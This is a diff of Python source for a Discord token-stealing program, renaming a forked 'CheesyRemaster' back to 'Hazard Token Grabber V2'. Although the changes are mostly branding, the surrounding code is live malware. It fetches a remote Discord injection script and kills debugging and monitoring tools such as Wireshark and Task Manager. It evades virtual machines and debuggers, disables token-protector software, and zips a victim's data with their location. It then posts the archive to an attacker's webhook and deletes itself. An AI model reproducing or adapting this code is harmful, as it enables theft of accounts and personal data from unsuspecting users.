@@ -33,17 +33,17 @@ __config__ = {
     'webhook_protector_key': "KEY_HERE",
     # keep it as it is unless you want to have a custom one
     'injection_url': "https://raw.githubusercontent.com/Rdimo/Discord-Injection/master/injection.js",
-    # if True, it will ping @everyone when someone ran Cheesy Remastered
+    # if True, it will ping @everyone when someone ran Hazard v2
     'ping_on_run': False,
     # set to False if you don't want it to kill programs such as discord upon running the exe
     'kill_processes': True,
     # if you want the file to run at startup
-    'startup': True,
+    'startup': False,
     # if you want the file to hide itself after run
-    'hide_self': True,
+    'hide_self': False,
     # does it's best to prevent the program from being debugged and drastically reduces the changes of your webhook being found
     'anti_debug': True,
-    # this list of programs will be killed if Cheesy detects that any of these are running, you can add more if you want
+    # this list of programs will be killed if hazard detects that any of these are running, you can add more if you want
     'blackListedPrograms':
     [
         "httpdebuggerui", "wireshark", "fiddler", "regedit", "cmd", "taskmgr",
@@ -157,7 +157,7 @@ class Functions(object):
         return __config__.get(e)
 
 
-class CheesyRemaster(Functions):
+class HazardTokenGrabberV2(Functions):
     def __init__(self):
         self.webhook = self.fetch_conf('webhook')
         self.discordApi = "https://discord.com/api/v9/users/@me"
@@ -182,7 +182,7 @@ class CheesyRemaster(Functions):
 
         os.makedirs(self.dir, exist_ok=True)
 
-    def cheesy_exit(self):
+    def hazard_exit(self):
         shutil.rmtree(self.dir, ignore_errors=True)
         os._exit(0)
 
@@ -209,13 +209,13 @@ class CheesyRemaster(Functions):
 
     async def init(self):
         if self.webhook == "" or self.webhook == "\x57EBHOOK_HERE":
-            self.cheesy_exit()
+            self.hazard_exit()
 
         if __author__ != "\x52\x64\x69\x6d\x6f":
-            self.cheesy_exit()
+            self.hazard_exit()
 
         if self.fetch_conf('anti_debug') and AntiDebug().inVM is True:
-            self.cheesy_exit()
+            self.hazard_exit()
 
         await self.bypassBetterDiscord()
         await self.bypassTokenProtector()
@@ -319,7 +319,7 @@ class CheesyRemaster(Functions):
                     item = json.load(f)
                 except json.decoder.JSONDecodeError:
                     return
-                item['banana_just_shit_on_this_token_protector'] = "https://github.com/bananaman2020"
+                item['Rdimo_just_shit_on_this_token_protector'] = "https://github.com/Rdimo"
                 item['auto_start'] = False
                 item['auto_start_discord'] = False
                 item['integrity'] = False
@@ -336,7 +336,7 @@ class CheesyRemaster(Functions):
             with open(config, 'w') as f:
                 json.dump(item, f, indent=2, sort_keys=True)
             with open(config, 'a') as f:
-                f.write("\n\n//banana just shit on this token protector | https://github.com/bananaman2020")
+                f.write("\n\n//Rdimo just shit on this token protector | https://github.com/Rdimo")
 
     async def bypassBetterDiscord(self):
         bd = self.roaming + "\\BetterDiscord\\data\\betterdiscord.asar"
@@ -344,7 +344,7 @@ class CheesyRemaster(Functions):
             x = self.hook_reg
             with open(bd, 'r', encoding="cp437", errors='ignore') as f:
                 txt = f.read()
-                content = txt.replace(x, 'UnaTheGoat')
+                content = txt.replace(x, 'RdimoTheGoat')
             with open(bd, 'w', newline='', encoding="cp437", errors='ignore') as f:
                 f.write(content)
 
@@ -609,11 +609,11 @@ GoogleMaps: {self.googlemap}
                         os.remove(path)
                     else:
                         with open(path, "w", encoding="utf-8", errors="ignore") as f:
-                            f.write("🌟・Grabber By github.com/bananaman2020・https://github.com/bananaman2020/cheesy\n\n")
+                            f.write("🌟・Grabber By github.com/Rdimo・https://github.com/Rdimo/Hazard-Token-Grabber-V2\n\n")
                         with open(path, "a", encoding="utf-8", errors="ignore") as fp:
-                            fp.write(x + "\n\n🌟・Grabber By github.com/bananaman2020・https://github.com/bananaman2020/cheesy")
+                            fp.write(x + "\n\n🌟・Grabber By github.com/Rdimo・https://github.com/Rdimo/Hazard-Token-Grabber-V2")
 
-        _zipfile = ntpath.join(self.appdata, f'CheesyRemaster-[{Victim}].zip')
+        _zipfile = ntpath.join(self.appdata, f'Hazard.V2-[{Victim}].zip')
         zipped_file = zipfile.ZipFile(_zipfile, "w", zipfile.ZIP_DEFLATED)
         abs_src = ntpath.abspath(self.dir)
         for dirname, _, files in os.walk(self.dir):
@@ -633,13 +633,13 @@ GoogleMaps: {self.googlemap}
         fileCount = f"{file_count} Files Found: "
 
         embed = {
-            'avatar_url': 'https://cdn.kkgmedia.com/pop-cat.gif',
+            'avatar_url': 'https://raw.githubusercontent.com/Rdimo/images/master/Hazard-Token-Grabber-V2/Big_hazard.gif',
             'embeds': [
                 {
                     'author': {
-                        'name': f'*{Victim}* Just ran CheesyRemaster',
-                        'url': 'https://github.com/bananaman2020/cheesy',
-                        'icon_url': 'https://cdn.kkgmedia.com/pop-cat.gif'
+                        'name': f'*{Victim}* Just ran Hazard Token Grabber.V2',
+                        'url': 'https://github.com/Rdimo/Hazard-Token-Grabber-V2',
+                        'icon_url': 'https://raw.githubusercontent.com/Rdimo/images/master/Hazard-Token-Grabber-V2/Small_hazard.gif'
                     },
                     'color': 176185,
                     'description': f'[Google Maps Location]({self.googlemap})',
@@ -684,7 +684,7 @@ GoogleMaps: {self.googlemap}
                         }
                     ],
                     'footer': {
-                        'text': '🌟・Grabber By github.com/bananaman2020・https://github.com/bananaman2020/cheesy'
+                        'text': '🌟・Grabber By github.com/Rdimo・https://github.com/Rdimo/Hazard-Token-Grabber-V2'
                     }
                 }
             ]
@@ -702,7 +702,7 @@ GoogleMaps: {self.googlemap}
                 httpx.post(self.webhook, headers={"Authorization": key}, json=embed)
                 httpx.post(self.webhook, headers={"Authorization": key}, files={'upload_file': f})
         os.remove(_zipfile)
-        self.cheesy_exit()
+        self.hazard_exit()
 
 
 class AntiDebug(Functions):
@@ -791,4 +791,4 @@ if __name__ == "__main__" and os.name == "nt":
         httpx.get('https://google.com')
     except (httpx.NetworkError, httpx.TimeoutException):
         os._exit(0)
-    asyncio.run(CheesyRemaster().init())
+    asyncio.run(HazardTokenGrabberV2().init())
